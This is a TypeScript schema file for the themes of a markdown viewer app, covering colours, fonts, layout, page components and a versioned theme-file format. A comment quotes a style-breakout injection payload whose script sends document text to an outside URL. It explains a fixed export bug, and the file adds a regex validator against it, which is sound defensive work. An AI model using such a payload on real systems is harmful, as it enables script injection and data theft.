import { z } from "zod";

/**
 * The `Theme` schema is the single source of truth for what a theme is.
 *
 * It lives on the frontend on purpose. Rust stores themes as opaque JSON
 * (`src-tauri/src/config.rs`) precisely so this shape exists in one place —
 * themes are also an export format users share as files, and a second copy in
 * Rust would be a second thing to keep in step for no benefit.
 *
 * Everything here maps 1:1 onto a `--doc-*` CSS custom property in
 * `lib/theme/apply.ts`. Adding a field means adding it there too, and
 * `apply.test.ts` fails if the two drift.
 */

/**
 * Characters that let a value stop being a value.
 *
 * A theme is a file people share, so its contents are as untrusted as a document.
 * `applyTheme` is safe on its own — `setProperty` goes through CSSOM, which cannot
 * be escaped — but the HTML exporter re-derives the same tokens as *text* and drops
 * them into a literal `<style>`. `<style>` is raw-text: the tokenizer ends it at the
 * first `</style`, so a colour of
 *
 *     #fff</style><script>fetch('https://…?'+document.body.innerText)</script>
 *
 * exported a file that runs script at `file://` with no CSP.
 *
 * Checked here rather than only in the exporter because this is the boundary an
 * imported theme crosses, and a value that cannot be represented is better rejected
 * at the door than carried around and escaped at each use.
 *
 * Deliberately a character rule and not a colour grammar. The looseness is on
 * purpose — presets are authored in `oklch()`, people paste hex out of a palette,
 * `var()` has to keep working — and a grammar tight enough to be safe would reject
 * valid CSS the app has always accepted. None of these characters appear in any
 * legitimate colour or font-family:
 *
 *   `<` `>`  end the `<style>` element
 *   `{` `}`  close the rule and open another
 *   `;`      end the declaration and start another
 *   `@`      open an at-rule (`@import` fetches)
 *   `url(`   fetches, which also breaks the offline claim
 *   `/*`     comment, used to swallow whatever follows
 */
const CSS_STRUCTURE = /[<>{};@\\]|url\s*\(|\/\*|\*\//i;

/** Shared with the HTML exporter, which is the place these characters actually bite. */
export function isSafeCssValue(value: string): boolean {
  return !CSS_STRUCTURE.test(value);
}

const cssValue = (label: string) =>
  z
    .string()
    .min(1)
    .refine(isSafeCssValue, {
      message: `${label} may not contain CSS structure (<>{};@, url(, or a comment)`,
    });

/** Any CSS color. Kept loose deliberately: presets are authored in oklch, users
 *  paste hex out of a palette, and both have to round-trip through an export. */
const color = cssValue("A colour");

export const AppearanceSchema = z.enum(["light", "dark"]);
export type Appearance = z.infer<typeof AppearanceSchema>;

/**
 * How much of the window the page may use.
 *
 * Deliberately *not* part of a theme, for the same reason zoom is not: it is a
 * property of the window you are reading in, not of the paper. A theme shared
 * with someone on a laptop should not force their page full width.
 *
 *  - `standard` — the page is the reading measure. What a viewer has always done.
 *  - `wide`     — half again as wide, so a table has room without the prose
 *                 losing its measure.
 *  - `full`     — everything the window has, minus the gutters.
 */
export const ContentWidthSchema = z.enum(["standard", "wide", "full"]);
export type ContentWidth = z.infer<typeof ContentWidthSchema>;

export const ThemeColorsSchema = z.object({
  bg: color,
  surface: color,
  text: color,
  textMuted: color,
  heading: color,
  link: color,
  linkHover: color,
  border: color,
  codeBg: color,
  codeBorder: color,
  accent: color,
  quoteBar: color,
  selection: color,
  alert: z.object({
    note: color,
    tip: color,
    important: color,
    warning: color,
    caution: color,
  }),
});
export type ThemeColors = z.infer<typeof ThemeColorsSchema>;

export const ThemeTypographySchema = z.object({
  /** A CSS font-family list. The picker offers bundled families, but any system
   *  family the user types is equally valid — hence a string, not an enum. */
  bodyFont: cssValue("A font family"),
  headingFont: cssValue("A font family"),
  monoFont: cssValue("A font family"),
  /** Base body size in px. Below 13 the serif faces lose their detail; above 28
   *  the measure stops fitting a sensible window. */
  baseSize: z.number().min(13).max(28),
  /** Modular scale ratio for headings. 1.0 is a flat hierarchy, 1.5 is dramatic. */
  scale: z.number().min(1).max(1.5),
  lineHeight: z.number().min(1.2).max(2.2),
  /** Content width in `ch`. 45–90 is the readable band; the slider allows a
   *  little either side for wide tables and small screens. */
  measure: z.number().min(40).max(120),
  /** Space between paragraphs, in em of the body size. */
  paragraphSpacing: z.number().min(0).max(3),
  /** Letter spacing in em. Negative tightens, which most sans faces want at size. */
  letterSpacing: z.number().min(-0.05).max(0.15),
  headingWeight: z.number().min(300).max(900),
  justify: z.boolean(),
  /** Break long words at the end of a line. Justified text without hyphenation
   *  opens rivers, so this defaults on — but it mangles identifiers in prose,
   *  which is why it is a switch and not a constant. */
  hyphenate: z.boolean().default(true),
  /** How one paragraph is told from the next. `spaced` is the web's blank line;
   *  `indented` is the book's first-line indent, and suppresses the space. */
  paragraphStyle: z.enum(["spaced", "indented"]).default("spaced"),
  /** Underline links always, only under the pointer, or never. */
  linkUnderline: z.enum(["always", "hover", "never"]).default("always"),
});
export type ThemeTypography = z.infer<typeof ThemeTypographySchema>;

/**
 * How the page is built, as distinct from how the type is set: gutters, table
 * shape, heading numbering. These change the structure of the page rather than
 * its voice, which is why they are their own group.
 */
export const ThemeLayoutSchema = z.object({
  /** The side gutter, in rem. It is what keeps a full-width table off the edge
   *  of the window, so it earns a control of its own once the page can be wide. */
  pagePadding: z.number().min(0).max(8).default(2),
  /** Number h2–h4 as 1., 1.1, 1.1.1 — worth having for specs, wrong for prose. */
  numberHeadings: z.boolean().default(false),
  table: z
    .object({
      density: z.enum(["comfortable", "compact"]).default("comfortable"),
      /** `hairline` rules rows only — the editorial default. `grid` adds the
       *  vertical rules a wide data table needs to stay trackable. */
      rules: z.enum(["hairline", "grid"]).default("hairline"),
      zebra: z.boolean().default(false),
    })
    .default({ density: "comfortable", rules: "hairline", zebra: false }),
});
export type ThemeLayout = z.infer<typeof ThemeLayoutSchema>;

/**
 * How the page's furniture is drawn — quotes, rules, callouts, code, lists.
 *
 * These were constants in `document.css` until themes started needing to differ
 * by more than palette. Eleven presets shared one typography set and one layout,
 * so the entire difference between Nord and Everforest was hue: the pages were
 * otherwise the same page. A theme is a voice, and a voice includes whether a
 * quotation is a barred block or a hanging indent.
 *
 * Every field is an enum or a bounded number, never CSS. That is a security
 * property as much as a design one: `isSafeCssValue` above exists because the
 * HTML exporter writes theme values into a raw-text `<style>`, and a closed set
 * of tokens cannot carry an escape at all. Enums land as `data-*` attributes on
 * the document root — the pattern `data-heading-numbers` already established —
 * and numbers land as custom properties.
 *
 * Every default reproduces exactly what the app drew before this group existed,
 * so a theme file exported by an earlier build imports unchanged and looks the
 * same.
 */
export const ThemeComponentsSchema = z.object({
  heading: z
    .object({
      /** A rule under h1, h2, both, or neither. GitHub draws one under both and
       *  it is the most recognisable thing about a README; nothing else here
       *  changes a page's character for so little ink. */
      rule: z.enum(["none", "h1", "h2", "h1-h2"]).default("none"),
      /** Was hardcoded at `-0.02em` for every face. That is a sans setting: a
       *  Garamond or a Newsreader at heading size wants nothing taken out, and
       *  several presets were being tracked as though they were Inter. */
      tracking: z.number().min(-0.06).max(0.06).default(-0.02),
      leading: z.number().min(1).max(1.6).default(1.22),
      /** h5 and h6. `uppercase` is what the app has always drawn; `small-caps`
       *  is the serif answer to the same problem and needs a face with real
       *  small caps to be worth choosing. */
      minor: z.enum(["uppercase", "small-caps", "normal"]).default("uppercase"),
    })
    .default({ rule: "none", tracking: -0.02, leading: 1.22, minor: "uppercase" }),

  /** `bar` is the rule-and-hang the app has always drawn. `hang` drops the rule
   *  and sets the quote larger in the margin, which is the book and the Medium
   *  answer. `card` is the tinted block a wiki uses. `plain` is italic alone. */
  quote: z.enum(["bar", "hang", "card", "plain"]).default("bar"),

  /** A thematic break. `asterism` (⁂) is the typographic form a book uses for a
   *  scene change, and reads as punctuation rather than as a divider. */
  rule: z.enum(["line", "short", "asterism", "space"]).default("line"),

  code: z
    .object({
      /** `card` is the filled, rounded block. `flush` drops the fill for a left
       *  rule, which stops a technical document reading as a stack of boxes.
       *  `framed` keeps the outline and loses the fill. */
      block: z.enum(["card", "flush", "framed"]).default("card"),
      inline: z.enum(["tint", "outline", "bare"]).default("tint"),
    })
    .default({ block: "card", inline: "tint" }),

  alert: z.enum(["bar", "card", "minimal"]).default("bar"),

  /** `dash` sets an en dash for unordered markers, `outdent` hangs the marker in
   *  the margin so the text edge stays flush — the book setting. */
  list: z.enum(["default", "dash", "outdent"]).default("default"),

  /** Table headers have always been uppercase and tracked. That is right for a
   *  data table and wrong in a serif theme, where it is the one shouting thing
   *  on an otherwise quiet page. */
  tableHead: z.enum(["uppercase", "sentence"]).default("uppercase"),

  image: z
    .object({
      radius: z.number().min(0).max(16).default(6),
      /** A hairline around the image. Needed on a light theme where a photo with
       *  a white edge otherwise bleeds into the paper. */
      frame: z.boolean().default(false),
    })
    .default({ radius: 6, frame: false }),
});
export type ThemeComponents = z.infer<typeof ThemeComponentsSchema>;

/** The defaults, as one object — presets spread it, and `apply.test.ts` uses it
 *  to assert that an unset group still produces today's tokens. */
export const DEFAULT_COMPONENTS: ThemeComponents = ThemeComponentsSchema.parse({});

export const ThemeCodeSchema = z.object({
  /** A Shiki theme id. `lindo-md-house-light` / `-dark` are ours, built from
   *  the House tokens so code reads as part of the page; everything else is the
   *  preset's authentic VS Code theme. */
  shikiTheme: z.string().min(1),
  lineNumbers: z.boolean(),
  /** Wrap long lines instead of scrolling them. Scrolling keeps the code's own
   *  line breaks honest; wrapping is what you want when reading rather than
   *  copying. */
  wrap: z.boolean().default(false),
});
export type ThemeCode = z.infer<typeof ThemeCodeSchema>;

export const ThemeSchema = z.object({
  id: z.string().min(1),
  name: z.string().min(1),
  appearance: AppearanceSchema,
  colors: ThemeColorsSchema,
  typography: ThemeTypographySchema,
  /** Defaulted so a theme file exported before this group existed still imports,
   *  and so a config written by an older build still loads. */
  layout: ThemeLayoutSchema.default({
    pagePadding: 2,
    numberHeadings: false,
    table: { density: "comfortable", rules: "hairline", zebra: false },
  }),
  /** Defaulted for the same reason `layout` is: every field reproduces what the
   *  app drew before the group existed, so an older theme file imports and looks
   *  identical rather than merely parsing. */
  components: ThemeComponentsSchema.default({
    heading: { rule: "none", tracking: -0.02, leading: 1.22, minor: "uppercase" },
    quote: "bar",
    rule: "line",
    code: { block: "card", inline: "tint" },
    alert: "bar",
    list: "default",
    tableHead: "uppercase",
    image: { radius: 6, frame: false },
  }),
  code: ThemeCodeSchema,
});
export type Theme = z.infer<typeof ThemeSchema>;

/**
 * A light/dark pair presented as one choice. Users pick "Nord", not "Nord Dark";
 * which half is shown follows the appearance setting.
 */
export const ThemePresetSchema = z.object({
  id: z.string().min(1),
  name: z.string().min(1),
  /** One line shown under the name in the theme gallery. */
  note: z.string(),
  light: ThemeSchema,
  dark: ThemeSchema,
});
export type ThemePreset = z.infer<typeof ThemePresetSchema>;

/**
 * The on-disk format for an exported theme. Versioned from day one: a theme file
 * a user shared last year must still import after the schema grows a field.
 */
export const ThemeFileSchema = z.object({
  format: z.literal("lindo-md-theme"),
  version: z.literal(1),
  theme: ThemeSchema,
});
export type ThemeFile = z.infer<typeof ThemeFileSchema>;
